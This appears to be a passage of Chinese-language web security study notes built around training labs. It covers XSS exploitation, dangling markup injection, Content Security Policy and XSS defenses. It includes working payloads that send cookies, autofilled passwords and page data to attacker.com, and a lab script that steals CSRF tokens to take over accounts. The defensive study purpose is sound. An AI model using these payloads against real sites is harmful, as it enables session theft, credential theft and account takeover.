| 受害者可能未登录 | 窃取的 Cookie 可能没有价值 |
| HttpOnly 标志 | 许多应用程序通过 HttpOnly 标志对 JavaScript 隐藏其 Cookie |
| 会话锁定 | 会话可能锁定到额外因素，如用户的 IP 地址 |
| 会话超时 | 会话可能在劫持之前超时 |

**示例 payload：**

```javascript
fetch('https://attacker.com/steal?c=' + document.cookie)
```

或使用 `new Image()` 避免 CORS 限制：

```javascript
new Image().src = 'https://attacker.com/steal?c=' + document.cookie
```

### 利用 XSS 捕获密码

如今许多用户拥有自动填充密码的密码管理器。可以利用以下方式：创建密码输入框，读取自动填充的密码，并将其发送到攻击者的域。此技术避免了窃取 Cookie 的大部分问题，甚至可能获取受害者重复使用相同密码的其他账户。

**示例 payload：**

```javascript
// 创建伪造的密码输入框
var passwordField = document.createElement('input');
passwordField.type = 'password';
passwordField.name = 'password';
passwordField.autocomplete = 'current-password';
document.body.appendChild(passwordField);

// 等待自动填充然后捕获
setTimeout(function() {
    fetch('https://attacker.com/steal?p=' + encodeURIComponent(passwordField.value));
}, 2000);
```

**缺点：** 此技术仅适用于具有执行密码自动填充的密码管理器的用户。

### 利用 XSS 绕过 CSRF 保护

XSS 使攻击者能够执行几乎任何合法用户可以在网站上执行的操作。通过在受害者浏览器中执行任意 JavaScript，XSS 允许以受害用户身份执行各种操作。

某些网站允许已登录用户在不重新输入密码的情况下更改其邮箱地址。如果在此类站点上发现 XSS 漏洞，可以利用它窃取 CSRF 令牌，然后更改受害者邮箱地址为攻击者控制的地址，最后触发密码重置以获取账户访问权限。

**这种利用类型将 XSS（窃取 CSRF 令牌）与 CSRF 通常针对的功能结合：**

| 维度 | 纯 CSRF | XSS + CSRF 混合攻击 |
|------|---------|-------------------|
| **通信方向** | 单向（攻击者诱导请求，看不到响应） | 双向（攻击者可发送请求并读取响应） |
| **CSRF 令牌防御** | 可有效防御普通 CSRF | XSS 可直接读取页面中的令牌值，完全绕过 |
| **攻击范围** | 单个操作的请求伪造 | 以受害者身份执行任意操作 |

> **关键洞察：** CSRF 令牌无法防御 XSS，因为 XSS 允许攻击者直接从响应中读取令牌值。

#### 案例：存储型 XSS 窃取 CSRF 令牌更改邮箱

**Lab: Exploiting XSS to bypass CSRF defenses**

##### 漏洞概述

此 Lab 的博客评论功能存在存储型 XSS 漏洞。目标：利用 XSS 窃取受害者的 CSRF 令牌，然后用该令牌更改受害者的邮箱地址。

用户账户页面 `/my-account` 包含一个修改邮箱的功能：
- 需要向 `/my-account/change-email` 发送 POST 请求，参数为 `email`
- 页面包含一个隐藏的 CSRF 令牌：`<input name="token" type="hidden" value="...">`

由于修改邮箱操作受 CSRF 令牌保护，单纯构造一个 POST 请求无法奏效。但 XSS 允许攻击者先读取页面内容获取有效令牌，再带着令牌发起修改请求，从而完全绕过 CSRF 防御。

##### 攻击 Payload

```javascript
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get', '/my-account', true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf=' + token + '&email=test@test.com')
};
```

##### Payload 执行流程分解

**第一步：发起 GET 请求获取用户账户页面**

```javascript
var req = new XMLHttpRequest();
req.onload = handleResponse;   // 请求完成后调用 handleResponse
req.open('get', '/my-account', true);  // 异步 GET 请求
req.send();                    // 发送请求
```

浏览器以受害者身份向 `/my-account` 发起 GET 请求，响应中包含受害者的个人信息页面 HTML，其中包括修改邮箱的表单和 CSRF 令牌。

**第二步：从响应中提取 CSRF 令牌**

```javascript
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
```

`this.responseText` 是 `/my-account` 页面的完整 HTML 源码。`match()` 方法使用正则表达式从 HTML 中提取 token 值：

| 正则部分 | 含义 |
|---------|------|
| `name="csrf"` | 匹配 CSRF 令牌的 input name 属性 |
| `value="(\w+)"` | 捕获 value 属性中的 token 值，`\w+` 匹配字母数字下划线 |
| `[1]` | 取捕获组中的第一个分组（即 `(\w+)` 匹配到的实际 token 值） |

**第三步：携带令牌发起修改邮箱的 POST 请求**

```javascript
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf=' + token + '&email=test@test.com')
```

POST 请求体包含两个参数：
- `csrf`：从上一步正则提取到的有效令牌，用于通过服务器的 CSRF 校验
- `email`：攻击者指定的邮箱地址，受害者邮箱被改为该地址

##### 攻击流程全景

```
受害者浏览博客评论
    |
    v
浏览器执行注入的 <script>
    |
    v
步骤1: XMLHttpRequest GET /my-account
    |  (以受害者身份，携带受害者 Cookie)
    v
服务器返回用户页面 HTML (包含 CSRF token)
    |
    v
步骤2: 正则提取 token
    |  match(/name="csrf" value="(\w+)"/)[1]
    v
步骤3: XMLHttpRequest POST /my-account/change-email
    |  请求体: csrf=<token>&email=test@test.com
    v
服务器校验 CSRF token 通过，邮箱被修改
    |
    v
攻击者使用新邮箱发起密码重置，接管账户
```

##### 关键技术点

**1. 为什么能绕过 CSRF 保护？**

| 场景 | CSRF 令牌 | 攻击结果 |
|------|----------|---------|
| 纯 CSRF 攻击 | 攻击者不知道令牌值，无法伪造有效请求 | 失败 |
| XSS + CSRF | XSS 脚本先读取页面中的令牌值，再携带令牌发起请求 | 成功 |

CSRF 令牌的设计目的是防止跨站请求伪造：攻击者无法读取其他域下的页面内容（受同源策略限制），因此不知道令牌值。但 XSS 使恶意脚本在目标域下执行，同源策略不再构成障碍，脚本可以自由读取同源页面内容并提取令牌。

**2. 异步请求与回调链**

整个攻击通过两段异步 XMLHttpRequest 串联完成。`req.onload = handleResponse` 确保第一步（获取 token）完成后才执行第二步（修改邮箱）。如果 token 尚未获取就发起修改请求，请求会因缺少有效 token 而失败。

**3. 时序问题与延迟的重要性**

在实际利用中，CSRF 令牌的获取和后续请求之间存在时序依赖。如果受害页面上存在其他异步加载的脚本或 DOM 操作（例如 CSRF 令牌由 JavaScript 动态生成或刷新），可能出现以下情况：

- 脚本执行时 token 尚未渲染到 DOM
- token 在页面加载后被轮换（token rotation）
- 页面元素加载顺序导致 `match()` 匹配失败

此时需要在两个请求之间引入延迟（如使用 `setTimeout` 或在 `onreadystatechange` 中检查 `readyState`），确保 token 获取时间晚于其生成/渲染时间，早于其过期/轮换时间。

**4. 为什么博客评论是理想的攻击载体？**

存储型 XSS 的自包含特性使攻击不需要外部交付机制。任何访问博客文章并加载评论的用户都会自动执行恶意脚本，无需点击链接或进行任何交互。受害者当前已登录，Cookie 有效，攻击成功率最高。

##### 与纯 CSRF 攻击的对比总结

| 维度 | 纯 CSRF | XSS 绕过 CSRF |
|------|--------|--------------|
| 攻击方式 | 诱导受害者点击恶意链接/访问恶意页面 | 在目标站点注入恶意脚本 |
| 获取令牌 | 无法获取（受同源策略保护） | 可读取页面 DOM，直接提取令牌值 |
| 请求来源 | 跨站（第三方域），无有效令牌 | 同源（目标域），携带合法令牌 |
| 防御效果 | CSRF 令牌有效阻止 | CSRF 令牌完全无效 |
| 前置条件 | 受害者在目标站点已登录 | 存在 XSS 漏洞 + 受害者在目标站点已登录 |

---

## 悬空标记注入（Dangling Markup Injection）

### 什么是悬空标记注入？

悬空标记注入是一种在无法进行完整 XSS 攻击的情况下跨域捕获数据的技术。

**与 XSS 的关键区别：** XSS 的目标是执行 JavaScript（弹窗、窃取 cookie、执行操作），而悬空标记注入的目标是**窃取页面上的敏感数据**（CSRF token、用户信息、邮件内容等），整个过程中不需要执行任何脚本。

#### 基本攻击原理

假设应用程序以不安全的方式将攻击者可控数据嵌入到其响应中：

```html
<input type="text" name="input" value="CONTROLLABLE DATA HERE
```

假设应用程序不过滤或转义 `>` 或 `"` 字符。攻击者可以使用以下语法脱离带引号的属性值和闭合标签，返回到 HTML 上下文：

```
">
```

如果常规 XSS 攻击因输入过滤器、内容安全策略或其他障碍而不可行，仍然可能通过以下 payload 交付悬空标记注入攻击：

```
"><img src='//attacker-website.com?
```

此 payload 创建一个 `img` 标签并定义 `src` 属性的开头，其中包含攻击者服务器上的 URL。payload 未闭合 `src` 属性，使其"悬空"。当浏览器解析响应时，将向前查找直到遇到单引号来终止属性。直到该字符之前的所有内容将被视为 URL 的一部分，并通过 URL 查询字符串发送到攻击者服务器。

**攻击结果：** 攻击者可以捕获注入点之后应用程序响应的部分内容，其中可能包含敏感数据（CSRF 令牌、邮件消息、财务数据等）。

#### 攻击过程逐步拆解

以搜索页面为例，应用程序将用户输入回显在 `<input>` 标签的 `value` 属性中：

```html
<!-- search.php -->
<input type="text" name="keyword" value="用户输入的关键词">
<p>您搜索的是：用户输入的关键词</p>
```

**步骤 1 —— 闭合原有标签：** 攻击者输入以 `">` 开头：

```
"><img src='//attacker.com/steal?
```

- `"` 闭合了 `value` 属性的双引号
- `>` 闭合了 `<input>` 标签
- `<img` 创建一个新的 img 标签，其 `src` 属性用单引号打开但故意不闭合

页面变为：

```html
<input type="text" name="keyword" value=""><img src='//attacker.com/steal?
<p>您搜索的是："><img src='//attacker.com/steal?</p>
```

**步骤 2 —— 浏览器"吞噬"后续内容：** 根据 HTML 解析规范，浏览器在"属性值（单引号）"状态下会持续读取所有字符，直到遇到以下两种情况之一才停止：

- 遇到下一个**未转义的单引号** `'`
- 到达**文件末尾**（EOF）

在攻击场景中，如果页面的其余部分使用双引号（`"`）定义属性（这是最常见的情况），则可能在很长一段距离内都没有单引号。浏览器会将注入点之后的**所有内容**都当作 `src` 属性值的一部分：

```html
<img src='//attacker.com/steal?<p>您搜索的是：...内容...</p>
<!-- CSRF token --><input type="hidden" name="csrf_token" value="abc123xyz">
<!-- 用户信息 --><p>欢迎，user@example.com</p>
```

**步骤 3 —— 数据被发送到攻击者服务器：** 浏览器解析到 `<img>` 标签后，会自动发起 HTTP 请求加载图片。由于 `src` 属性值包含了大量被"吞噬"的页面内容，这些内容作为 URL 的一部分被发送：

```
GET //attacker.com/steal?<p>您搜索的是：...<input type="hidden" name="csrf_token" value="abc123xyz">...
```

> **实际传输细节：** 现代浏览器在发送 HTTP 请求时会对 URL 中的特殊字符（`<`、`>`、空格、换行等）进行 URL 编码（如空格变为 `%20`、`<` 变为 `%3C`）。攻击者服务器虽然收到的是编码后的内容，但可以轻松解码还原出原始数据。攻击仍然成功。

**步骤 4 —— 攻击者查看日志获取数据：** 攻击者的服务器日志会记录完整的请求 URL，从中可以提取出受害页面的 HTML 片段，包括 CSRF token、用户个人信息等敏感数据。

#### 为什么称为"悬空"（Dangling）？

"悬空"形容的是属性值没有被闭合的状态 —— 就像一个没有关好的水龙头，内容不断"流"入属性值中。`src` 属性的开头单引号始终等不到闭合的同伴，沿途的所有页面内容都被"吸入" URL 中。

#### 可利用的 HTML 属性和标签

任何会触发浏览器发起外部请求的属性都可以用于悬空标记注入攻击：

| 标签 | 属性 | 触发方式 | 利用难度 |
|------|------|---------|---------|
| `<img>` | `src` | 自动 —— 浏览器解析到 img 标签时立即发起图片请求 | 低（首选） |
| `<link>` | `href` | 自动 —— 浏览器解析到 link 标签时发起请求（如样式表） | 低 |
| `<script>` | `src` | 自动 —— 浏览器解析到 script 标签时发起请求 | 低 |
| `<iframe>` | `src` | 自动 —— 浏览器解析到 iframe 标签时发起请求 | 低 |
| `<a>` | `href` | 手动 —— 需要用户点击链接才能发起导航 | 高 |
| `<form>` | `action` | 手动 —— 需要用户提交表单才能发起请求 | 高 |

**首选标签：** `<img>` 是最常用的，因为它无需用户交互、几乎所有网站都允许加载图片、且大多数 CSP 策略对图片源的管控相对宽松。

#### 实际案例 —— 邮件预览页面

假设一个邮件客户端存在注入漏洞：

```html
<!-- 邮件预览页面 -->
<div>
    邮件内容：
    <div id="email-body">
        <?php echo $email_content; ?>   <!-- 直接输出邮件内容，未转义 -->
    </div>
    <!-- 下方包含用户的敏感数据 -->
    <input type="hidden" name="csrf" value="abc123xyz">
</div>
```

攻击者向受害者发送一封邮件，邮件内容为：

```
"><img src='//attacker.com/steal?
```

受害者打开邮件预览，页面渲染为：

```html
<div>
    邮件内容：
    <div id="email-body">
        "><img src='//attacker.com/steal?
    </div>
    <input type="hidden" name="csrf" value="abc123xyz">
</div>
```

浏览器解析后形成：

```html
<img src='//attacker.com/steal?</div><input type="hidden" name="csrf" value="abc123xyz"></div>
```

攻击者服务器收到的请求 URL 中包含了 CSRF token 值。即使无法执行任何 JavaScript，敏感数据仍然被窃取。

#### 为什么不需要 JavaScript 也能成功？

因为浏览器的网络请求是**自动触发**的：

1. 浏览器解析 HTML 遇到 `<img src='...'>`
2. 自动发起 HTTP 请求加载图片资源
3. 浏览器不关心 src 的值是否合法 —— 它只是忠实地构造 URL 并发送请求
4. 请求的 URL 中包含了被"吞噬"的页面内容
5. 攻击者服务器记录请求日志，从中提取敏感数据

整个过程不涉及任何 JavaScript 执行，因此可以绕过 CSP 的脚本限制、输入过滤器对 `<script>` 的检测等防护措施。

---

### 如何防御悬空标记注入

- **在输出时编码数据：** 与 XSS 防御相同 —— 将 `<`、`>`、`"`、`'` 等 HTML 特殊字符编码为对应的实体（`&lt;`、`&gt;`、`&quot;`、`&#39;`）。只要攻击者无法注入 `"` 和 `>`，就无法脱离属性上下文
- **在输入到达时验证输入：** 对用户输入进行白名单验证，拒绝包含 HTML 元字符的输入
- **使用 CSP 策略：** 通过 `img-src`、`script-src`、`style-src` 等指令限制浏览器只能从可信源加载外部资源，阻止数据被发送到攻击者控制的域名
- **浏览器层面的防护：** Chrome 浏览器已实施保护措施，阻止 `<img>` 等标签加载 URL 中包含原始换行符和尖括号等危险字符的资源，从而限制了悬空标记注入的利用范围。但不应依赖浏览器防护作为唯一的防御手段

---

## Content Security Policy（CSP）

### 什么是 CSP？

CSP（Content Security Policy，内容安全策略）是一种浏览器安全机制，旨在减轻 XSS 和其他攻击的影响。它通过限制页面可以加载的资源（如脚本和图像）以及限制页面是否可以被其他页面框架化来工作。

要启用 CSP，响应需要包含一个名为 `Content-Security-Policy` 的 HTTP 响应头，其值包含策略。策略本身由一个或多个指令组成，用分号分隔。

### 使用 CSP 减轻 XSS 攻击

**限制脚本来源：**

```
script-src 'self'
```

仅允许从与页面本身相同的源加载脚本。

```
script-src https://scripts.normal-website.com
```

仅允许从特定域加载脚本。

**注意：** 允许来自外部域的脚本时应谨慎。如果攻击者有任何控制从外部域提供的内容的方法，他们可能能够交付攻击。例如，不使用按客户划分 URL 的 CDN（如 `ajax.googleapis.com`）不应被信任，因为第三方可以将内容投递到其域上。

**Nonces 和 Hashes：**

| 机制 | 说明 | 安全要求 |
|------|------|---------|
| **Nonce（随机数）** | CSP 指令指定 nonce（随机值），加载脚本的标签中必须使用相同的值 | Nonce 必须在每次页面加载时安全生成且不可被攻击者猜测 |
| **Hash（哈希）** | CSP 指令指定受信任脚本内容的哈希 | 如果脚本内容发生变化，需要更新指令中指定的哈希值 |

**常见的 CSP 绕过：** 许多 CSP 阻止 `script` 等资源，但允许图像请求。这意味着通常可以使用 `img` 元素向外部服务器发出请求，例如泄露 CSRF 令牌。

某些策略更严格，阻止所有形式的外部请求。但仍然可以通过诱导用户交互来绕过这些限制——注入一个 HTML 元素，当点击时，将存储并发送注入元素所包裹的所有内容到外部服务器。

### 通过策略注入绕过 CSP

可能遇到将输入反射到实际策略中的网站，最可能是在 `report-uri` 指令中。如果站点反射可控参数，可以注入分号添加自己的 CSP 指令。通常 `report-uri` 是指令列表中的最后一条，这意味着需要覆盖现有指令以利用此漏洞并绕过策略。

**关键绕过：** Chrome 引入了 `script-src-elem` 指令，允许控制 `script` 元素但不控制事件。关键的是，此新指令允许覆盖现有的 `script-src` 指令。

### 使用 CSP 防御点击劫持

```
frame-ancestors 'self'
```

仅允许页面被来自相同源的页面框架化。

```
frame-ancestors 'none'
```

完全阻止框架化。

使用 CSP 防御点击劫持比使用 `X-Frame-Options` 头更灵活，因为可以指定多个域并使用通配符：

```
frame-ancestors 'self' https://normal-website.com https://*.robust-website.com
```

CSP 还会验证父框架层级中的每个框架，而 `X-Frame-Options` 仅验证顶层框架。

---

## 如何防御 XSS

### 总体策略

防止跨站脚本漏洞通常涉及以下措施的组合：

| 防御层 | 策略 | 说明 |
|--------|------|------|
| **第一层：输出编码** | 在用户可控数据写入页面之前进行编码 | 根据写入的上下文（HTML、JavaScript、URL、CSS）选择正确的编码类型 |
| **第二层：输入验证** | 在接收用户输入时进行严格过滤 | 基于预期或有效的输入，使用白名单进行过滤 |
| **第三层：响应头** | 使用 `Content-Type` 和 `X-Content-Type-Options` 头 | 确保浏览器按预期方式解释响应 |
| **第四层：CSP** | 作为最后一道防线 | 减轻仍可能存在的 XSS 漏洞的严重性 |

### 在输出时编码数据

编码应在用户可控数据写入页面之前直接应用，因为写入的上下文决定了需要使用哪种编码。

**HTML 上下文：** 将非白名单值转换为 HTML 实体：

| 字符 | 编码为 |
|------|--------|
| `<` | `&lt;` |
| `>` | `&gt;` |
| `"` | `&quot;` |
| `'` | `&#x27;` |
| `&` | `&amp;` |

**JavaScript 字符串上下文：** 对非字母数字值进行 Unicode 转义：

| 字符 | 编码为 |
|------|--------|
| `<` | `<` |
| `>` | `>` |

**多层编码：** 有时需要按正确顺序应用多层编码。例如，要将用户输入安全嵌入事件处理器中，需要同时处理 JavaScript 上下文和 HTML 上下文——首先进行 Unicode 转义，然后进行 HTML 编码：

```html
<a href="#" onclick="x='This string needs two layers of escaping'">test</a>
```

### 在输入到达时验证输入

编码可能是最重要的 XSS 防御线，但在每种上下文中防止 XSS 漏洞不够。应在首次从用户接收输入时尽可能严格地进行验证。

| 验证类型 | 示例 |
|----------|------|
| URL 验证 | 验证以安全协议（HTTP/HTTPS）开头，否则可能利用 `javascript:` 或 `data:` 等有害协议 |
| 数值验证 | 如果用户提供的值预期为数值，验证其包含整数 |
| 字符集验证 | 验证输入仅包含预期字符集 |

**白名单优于黑名单：** 与其列出所有有害协议（`javascript`、`data` 等），不如列出安全协议（HTTP、HTTPS）并禁止列表之外的任何内容。这将确保防御在出现新有害协议时不会失效，并降低受制于混淆无效值以逃避黑名单的攻击的敏感性。

### 允许"安全" HTML

应尽可能避免允许用户发布 HTML 标记，但有时这是业务需求。经典方法是尝试过滤掉具有潜在危害的标签和 JavaScript。

由于浏览器解析引擎的差异和 mutation XSS 等怪异行为，使用安全标签和属性的白名单实现这种方法极其困难。

**最低风险的选项：** 使用在用户浏览器中执行过滤和编码的 JavaScript 库，如 DOMPurify。其他库允许用户以 markdown 格式提供内容并将 markdown 转换为 HTML。但所有这些库都会不时出现 XSS 漏洞，因此需密切监控安全更新。

### PHP 中的 XSS 防御

**HTML 上下文：** 使用内置的 `htmlentities` 函数：

```php
<?php echo htmlentities($input, ENT_QUOTES, 'UTF-8'); ?>
```

三个参数：
- 输入字符串
- `ENT_QUOTES`：指定所有引号应被编码
- 字符集：大多数情况下应为 UTF-8

**JavaScript 字符串上下文：** 需要对输入进行 Unicode 转义。PHP 不提供内建 API 来 Unicode 转义字符串，需要自行实现：

```php
<?php
function jsEscape($str) {
    $output = '';
    $str = str_split($str);
    for($i = 0; $i < count($str); $i++) {
        $chrNum = ord($str[$i]);
        $chr = $str[$i];
        if($chrNum === 226) {
            if(isset($str[$i+1]) && ord($str[$i+1]) === 128) {
                if(isset($str[$i+2]) && ord($str[$i+2]) === 168) {
                    $output .= ' ';
                    $i += 2;
                    continue;
                }
                if(isset($str[$i+2]) && ord($str[$i+2]) === 169) {
                    $output .= ' ';
                    $i += 2;
                    continue;
                }
            }
        }
        switch($chr) {
            case "'":
            case '"':
            case "\n";
            case "\r";
            case "&";
            case "\\";
            case "<":
            case ">":
                $output .= sprintf("\\u%04x", $chrNum);
            break;
            default:
                $output .= $str[$i];
            break;
        }
    }
    return $output;
}
?>
```

使用方式：

```php
<script>x = '<?php echo jsEscape($_GET['x'])?>';</script>
```

### JavaScript 客户端 XSS 防御

**HTML 上下文编码：**

```javascript
function htmlEncode(str) {
    return String(str).replace(/[^\w. ]/gi, function(c) {
        return '&#' + c.charCodeAt(0) + ';';
    });
}
```

使用：

```javascript
document.body.innerHTML = htmlEncode(untrustedValue);
```

**JavaScript 字符串 Unicode 编码：**

```javascript
function jsEscape(str) {
    return String(str).replace(/[^\w. ]/gi, function(c) {
        return '\\u' + ('0000' + c.charCodeAt(0).toString(16)).slice(-4);
    });
}
```

使用：

```javascript
document.write('<script>x="' + jsEscape(untrustedValue) + '";<\/script>');
```

### jQuery 中的 XSS 防御

jQuery 中最常见的 XSS 形式是将用户输入传递给 jQuery 选择器。jQuery 已修补其选择器逻辑，检查输入是否以 `#` 开头，现在 jQuery 仅在第一个字符是 `<` 时渲染 HTML。

**安全实践：**

- 使用 `$().text()` 而非 `$().html()` 设置文本内容
- 如果必须将不可信数据传递给 jQuery 选择器，使用 `jsEscape` 函数正确转义值
- 不使用 `eval()` 解析 JSON（使用 `JSON.parse()`）

### 模板引擎防御

许多现代网站使用服务端模板引擎（如 Twig、Freemarker）在 HTML 中嵌入动态内容。它们通常定义了自己的转义系统。

例如，在 Twig 中，可以使用 `e()` 过滤器，参数定义上下文：

```twig
{{ user.firstname | e('html') }}
```

某些模板引擎（如 Jinja 和 React）默认转义动态内容，有效防止了大多数 XSS 发生。

> **警告：** 如果直接将用户输入拼接到模板字符串中，将面临服务端模板注入（SSTI）的风险，这通常比 XSS 更严重。

### 使用 CSP 作为最后防线

CSP 是防御跨站脚本的最后一道防线。如果 XSS 防御失败，可以使用 CSP 通过限制攻击者的能力来减轻 XSS。

CSP 允许控制各个方面，如是否可以加载外部脚本以及是否执行内联脚本。部署 CSP 需要在响应中包含 `Content-Security-Policy` HTTP 头。

安全的 CSP 起步策略：

```
default-src 'self'; script-src 'self'; object-src 'none'; frame-ancestors 'none'; base-uri 'self'; form-action 'self';
```

**关键原则：**

- 资源（图像、脚本等）只能从与主页面相同的源加载
- 即使攻击者注入 XSS payload，也只能从当前源加载资源
- 如果需要加载外部资源，确保仅允许不会帮助攻击者利用站点的脚本
- 尽可能托管资源在自己的域上
- 如果不可能，使用 hash 或 nonce 策略允许不同域上的脚本

---

## XSS 与 CSRF 的区别

### 核心差异

| 维度 | XSS (Cross-Site Scripting) | CSRF (Cross-Site Request Forgery) |
|------|---------------------------|----------------------------------|
| **定义** | 使网站返回恶意 JavaScript，在受害者浏览器中执行 | 诱导受害用户执行其本不打算执行的操作 |
| **严重性** | 通常更严重 | 通常影响范围较小 |
| **作用范围** | 成功利用后可执行用户能够执行的任何操作 | 通常仅适用于用户可以执行的操作子集 |
| **数据流向** | "双向" -- 攻击者注入的脚本可以发出任意请求、读取响应并将数据外泄 | "单向" -- 攻击者可以诱导受害者发出 HTTP 请求，但无法获取该请求的响应 |
| **防御关键** | 输出编码 + 输入验证 + CSP | CSRF 令牌 + SameSite Cookie + Referer 验证 |
| **与同源策略关系** | 绕过同源策略（脚本在目标域上下文中执行） | 部分绕过同源策略（利用浏览器自动携带 Cookie 的行为） |

### CSRF 令牌能否防止 XSS 攻击？

某些 XSS 攻击确实可以通过有效使用 CSRF 令牌来防止。

考虑一个简单的反射型 XSS 漏洞：

```
https://insecure-website.com/status?message=<script>/*+Bad+stuff+here...+*/</script>
```

如果漏洞功能包含了 CSRF 令牌：

```
https://insecure-website.com/status?csrf-token=CIwNZNlR4XbisJF39I8yWnWX9wX4WFoz&message=<script>/*+Bad+stuff+here...+*/</script>
```

假设服务器正确验证 CSRF 令牌并拒绝没有有效令牌的请求，令牌确实可以防止此 XSS 漏洞的利用。关键点在于：**反射型 XSS 涉及跨站请求，通过防止攻击者伪造跨站请求，应用程序防止了 XSS 漏洞的简单利用。**

**重要限制：**

1. 如果站点上其他地方存在未被 CSRF 令牌保护的反射型 XSS 漏洞，该 XSS 仍可被正常利用
2. 如果站点上存在可利用的 XSS 漏洞，即使目标操作本身受 CSRF 令牌保护，XSS 也可以被用来让受害用户执行这些操作（攻击者的脚本可以请求相关页面获取有效 CSRF 令牌）
3. CSRF 令牌**不能防御存储型 XSS**。如果一个受 CSRF 令牌保护的页面同时也是存储型 XSS 的输出点，该 XSS 仍然可以正常利用（攻击者提交恶意数据时不需要 CSRF 令牌来通过存储操作）

---

## XSS 常见问题

| 问题                    | 答案                                                                                                              |
| --------------------- | --------------------------------------------------------------------------------------------------------------- |
| **XSS 漏洞有多常见？**       | XSS 漏洞非常常见，XSS 可能是最频繁出现的 Web 安全漏洞                                                                               |
| **XSS 攻击有多常见？**       | 难以获得关于真实世界 XSS 攻击的可靠数据，但可能比其他漏洞利用频率低                                                                            |
| **XSS 和 CSRF 的区别？**   | XSS 涉及使网站返回恶意 JavaScript，而 CSRF 涉及诱导受害用户执行其不打算执行的操作                                                             |
| **XSS 和 SQL 注入的区别？**  | XSS 是针对其他应用程序用户的客户端漏洞，而 SQL 注入是针对应用程序数据库的服务器端漏洞                                                                 |
| **如何在 PHP 中防御 XSS？**  | 用白名单过滤输入，使用类型提示或类型转换；用 `htmlentities` 和 `ENT_QUOTES` 对 HTML 上下文进行输出转义，或对 JavaScript 上下文使用 JavaScript Unicode 转义 |
| **如何在 Java 中防御 XSS？** | 用白名单过滤输入，使用 Google Guava 等库对 HTML 上下文进行 HTML 编码输出，或对 JavaScript 上下文使用 JavaScript Unicode 转义                     |

---

> **参考：** [CSRF](../Cross-site%20request%20forgery%20(CSRF)/Cross-site%20request%20forgery%20(CSRF).md) | [JavaScript for XSS](./JavaScript%20for%20XSS/JavaScript%20for%20XSS.md) | [DOM and Browser](./DOM%20and%20Browser/DOM%20and%20Browser.md) | [XSS Payloads](./XSS%20Payloads/XSS%20Payloads.md) | [Content Security Policy](./Content%20Security%20Policy/Content%20Security%20Policy.md) | [XSS Prevention](./XSS%20Prevention/XSS%20Prevention.md)
